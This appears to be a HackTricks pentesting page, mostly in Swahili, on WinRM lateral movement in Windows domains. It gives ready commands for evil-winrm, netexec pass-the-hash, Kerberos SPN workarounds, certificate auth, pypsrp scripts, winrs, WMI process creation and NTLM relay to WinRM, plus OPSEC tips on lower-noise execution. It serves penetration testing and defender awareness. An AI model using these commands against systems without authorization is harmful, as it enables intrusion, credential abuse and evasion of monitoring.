# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ni mojawapo ya transport za **lateral movement** zinazofaa zaidi katika mazingira ya Windows kwa sababu inakupa remote shell kupitia **WS-Man/HTTP(S)** bila kuhitaji mbinu za kuunda services za SMB. Ikiwa target inaonyesha **5985/5986** na principal yako inaruhusiwa kutumia remoting, mara nyingi unaweza kutoka kwenye "valid creds" hadi "interactive shell" kwa haraka sana.

Kwa **protocol/service enumeration**, listeners, kuwezesha WinRM, `Invoke-Command`, na matumizi ya jumla ya clients, angalia:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Kwa nini operators wanapenda WinRM

- Inatumia **HTTP/HTTPS** badala ya SMB/RPC, hivyo mara nyingi hufanya kazi mahali ambapo execution ya mtindo wa PsExec imezuiwa.
- Ikiwa unatumia **Kerberos**, huepuka kutuma credentials zinazoweza kutumika tena kwenda kwa target.
- Inafanya kazi vizuri kutoka **Windows**, **Linux**, na tooling ya **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interactive PowerShell remoting path huanzisha **`wsmprovhost.exe`** kwenye target chini ya user context iliyothibitishwa, jambo ambalo kiutendaji ni tofauti na service-based exec.

## Access model na prerequisites

Kwa vitendo, mafanikio ya WinRM lateral movement yanategemea mambo **matatu**:

1. Target ina **WinRM listener** (`5985`/`5986`) na firewall rules zinazoruhusu access.
2. Account inaweza **ku-authenticate** kwenye endpoint.
3. Account inaruhusiwa **kufungua remoting session**.

Njia za kawaida za kupata access hiyo:

- **Local Administrator** kwenye target.
- Uanachama katika **Remote Management Users** kwenye systems mpya zaidi au **WinRMRemoteWMIUsers__** kwenye systems/components ambazo bado zinaheshimu group hiyo.
- Remoting rights zilizokabidhiwa wazi kupitia local security descriptors / mabadiliko ya PowerShell remoting ACL.

Ikiwa tayari unadhibiti box yenye admin rights, kumbuka kwamba unaweza pia **kukabidhi WinRM access bila uanachama kamili katika admin group** kwa kutumia techniques zilizoelezwa hapa:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas muhimu wakati wa lateral movement

- **Kerberos inahitaji hostname/FQDN**. Ukiunganisha kwa IP, client kwa kawaida hurudi kwenye **NTLM/Negotiate**.
- Katika **workgroup** au hali za cross-trust, NTLM kwa kawaida inahitaji ama **HTTPS** au target kuongezwa kwenye **TrustedHosts** kwenye client.
- Kwa **local accounts** kupitia Negotiate katika workgroup, UAC remote restrictions zinaweza kuzuia access isipokuwa built-in Administrator account itumike au `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting kwa kawaida hutumia **`HTTP/<host>` SPN**. Katika mazingira ambayo `HTTP/<host>` tayari imesajiliwa kwa service account nyingine, WinRM Kerberos inaweza kushindwa kwa `0x80090322`; tumia SPN yenye port au badili kwenda **`WSMAN/<host>`** pale ambapo SPN hiyo ipo.<sup>[[3]](#references)</sup>

Ukipata valid credentials wakati wa password spraying, kuzithibitisha kupitia WinRM mara nyingi ndiyo njia ya haraka zaidi ya kuangalia kama zinaweza kukupa shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec kwa validation na one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM kwa interactive shells

`evil-winrm` bado ndilo chaguo rahisi zaidi kwa interactive shells kutoka Linux kwa sababu linaunga mkono **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, uhamishaji wa mafaili, na upakiaji wa PowerShell/.NET ndani ya memory.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN: hali maalum ya `HTTP` dhidi ya `WSMAN`

Wakati **`HTTP/<host>`** SPN chaguomsingi inaposababisha hitilafu za Kerberos, jaribu kuomba/kutumia ticket ya **`WSMAN/<host>`** badala yake. Hili huonekana katika mipangilio ya enterprise iliyoimarishwa au isiyo ya kawaida ambapo **`HTTP/<host>`** tayari imehusishwa na akaunti nyingine ya huduma.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Hii pia ni muhimu baada ya matumizi mabaya ya **RBCD / S4U** unapounda au kuomba hasa service ticket ya **WSMAN** badala ya ticket ya jumla ya `HTTP`.

### Uthibitishaji unaotegemea certificate

WinRM pia inaauni **client certificate authentication**, lakini certificate lazima iwe imehusishwa kwenye target na **local account**. Kwa mtazamo wa offensive, hili ni muhimu wakati:

- uliiba au ku-export certificate halali ya client pamoja na private key ambayo tayari imehusishwa na WinRM;
- ulitumia vibaya **AD CS / Pass-the-Certificate** ili kupata certificate ya principal, kisha ukafanya pivot kuelekea authentication path nyingine;
- unaendesha shughuli katika mazingira ambayo huepuka kwa makusudi remoting inayotegemea password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM si ya kawaida sana kuliko password/hash/Kerberos auth, lakini inapopatikana inaweza kutoa njia ya **passwordless lateral movement** inayostahimili password rotation.

### Python / automation with `pypsrp`

Ikiwa unahitaji automation badala ya operator shell, `pypsrp` inakupa WinRM/PSRP kutoka Python ikiwa na support ya **NTLM**, **certificate auth**, **Kerberos**, na **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Ikiwa unahitaji udhibiti wa kina zaidi kuliko wrapper ya kiwango cha juu ya `Client`, API za kiwango cha chini za `WSMan` + `RunspacePool` ni muhimu kwa matatizo mawili ya kawaida ya operator:

- kulazimisha **`WSMAN`** itumike kama service/SPN ya Kerberos badala ya matarajio chaguo-msingi ya **`HTTP`** yanayotumiwa na PowerShell clients wengi;
- kuunganisha kwenye **PSRP endpoint** isiyo ya chaguo-msingi kama **JEA** / session configuration maalum badala ya `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Custom PSRP endpoints na JEA ni muhimu wakati wa lateral movement

WinRM authentication iliyofanikiwa **haimaanishi kila mara kwamba utaingia katika endpoint ya kawaida isiyo na vikwazo `Microsoft.PowerShell`**. Mazingira yaliyokomaa yanaweza kuweka wazi **custom session configurations** au endpoints za **JEA** zenye ACLs zao na tabia zao za run-as.<sup>[[1]](#references)</sup>

Ikiwa tayari una **code execution** kwenye Windows host na unataka kuelewa ni remoting surfaces zipi zinapatikana, enumerate endpoints zilizosajiliwa:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Wakati endpoint muhimu ipo, ilenge moja kwa moja badala ya shell ya default:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Athari za **offensive** kwa vitendo:

- Endpoint **iliyozuiwa** bado inaweza kutosha kwa lateral movement ikiwa inaonyesha cmdlets/functions zinazofaa kwa udhibiti wa services, ufikiaji wa files, uundaji wa processes, au utekelezaji wa .NET / external commands kiholela.
- Role ya **JEA** iliyosanidiwa vibaya ni yenye thamani hasa ikiwa inaonyesha commands hatari kama `Start-Process`, wildcards pana, providers zinazoweza kuandikwa, au proxy functions maalum zinazokuruhusu kutoroka restrictions zilizokusudiwa.
- Endpoints zinazotumia **RunAs virtual accounts** au **gMSAs** hubadilisha security context inayotumika ya commands unazoendesha. Hasa, endpoint inayotumia gMSA inaweza kutoa **network identity kwenye second hop** hata wakati session ya kawaida ya WinRM ingekumbana na tatizo maarufu la delegation.

## Lateral movement ya WinRM ya asili ya Windows

### `winrs.exe`

`winrs.exe` imejengwa ndani ya Windows na ni muhimu unapotaka **native WinRM command execution** bila kufungua interactive PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Flags mbili ni rahisi kusahaulika na ni muhimu kwa vitendo:

- `/noprofile` mara nyingi huhitajika wakati principal wa mbali **si local administrator**.
- `/allowdelegate` huwezesha remote shell kutumia credentials zako dhidi ya **host wa tatu** (kwa mfano, wakati command inahitaji `\\fileserver\share`).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Kwa upande wa kiutendaji, `winrs.exe` kwa kawaida husababisha msururu wa michakato ya mbali unaofanana na:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Hili ni jambo la kukumbuka kwa sababu linatofautiana na service-based exec na interactive PSRP sessions.

### `winrm.cmd` / WS-Man COM badala ya PowerShell remoting

Unaweza pia kutekeleza kupitia **WinRM transport** bila `Enter-PSSession` kwa kuinvoking WMI classes kupitia WS-Man. Hii inadumisha transport kama WinRM huku remote execution primitive ikiwa **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Mbinu hiyo ni muhimu wakati:

- PowerShell logging inafuatiliwa kwa karibu.
- Unataka **WinRM transport**, lakini si mtiririko wa kawaida wa PS remoting.
- Unaunda au unatumia tooling maalum inayozunguka **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Wakati SMB relay imezuiwa na signing na LDAP relay imewekewa vikwazo, **WS-Man/WinRM** bado inaweza kuwa lengo zuri la relay. `ntlmrelayx.py` ya kisasa inajumuisha seva za **WinRM relay** na inaweza ku-relay kwenda kwenye malengo ya **`wsman://`** au **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Vidokezo viwili vya kiutendaji:

- Relay huwa na manufaa zaidi wakati target inakubali **NTLM** na principal iliyorelayiwa inaruhusiwa kutumia WinRM.
- Impacket code ya hivi karibuni hushughulikia mahususi maombi ya **`WSMANIDENTIFY: unauthenticated`**, hivyo probes za mtindo wa `Test-WSMan` hazivurugi relay flow.

Kwa vikwazo vya multi-hop baada ya kupata WinRM session ya kwanza, angalia:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Vidokezo vya OPSEC na detection

- **Interactive PowerShell remoting** kwa kawaida huunda **`wsmprovhost.exe`** kwenye target.
- **`winrs.exe`** kwa kawaida huunda **`winrshost.exe`**, kisha huunda child process iliyoombwa.
- Custom **JEA** endpoints zinaweza kutekeleza actions kama virtual accounts za **`WinRM_VA_*`** au kama **gMSA** iliyosanidiwa; jambo hili hubadilisha telemetry na tabia ya second-hop ikilinganishwa na shell ya kawaida iliyo katika user context.<sup>[[1]](#references)</sup>
- Tarajia telemetry ya **network logon**, matukio ya WinRM service, na PowerShell operational/script-block logging ikiwa unatumia PSRP badala ya raw `cmd.exe`.
- Ikiwa unahitaji command moja tu, `winrs.exe` au one-shot WinRM execution inaweza kuwa na kelele kidogo kuliko interactive remoting session ya muda mrefu.
- Ikiwa Kerberos inapatikana, pendelea **FQDN + Kerberos** badala ya IP + NTLM ili kupunguza masuala ya trust pamoja na mabadiliko yasiyofaa ya upande wa client kwenye `TrustedHosts`.

## References

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
